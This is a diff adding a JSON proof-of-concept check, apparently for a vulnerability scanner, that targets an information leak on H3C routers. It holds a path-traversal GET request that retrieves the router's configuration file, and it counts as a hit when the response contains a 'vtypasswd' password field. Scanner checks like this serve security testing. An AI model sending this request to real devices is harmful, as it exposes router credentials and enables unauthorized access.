@@ -1,0 +1,15 @@
+//这个漏洞poc很多,工具没办法全覆盖，有机会优化工具
+{
+	"name":"H3C路由器userLogin.asp信息泄漏",
+	"tag":"h3c",
+	"type":"other",
+	"poc":{
+		"pocGet":"/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(vtypasswd)"
+	}
+}
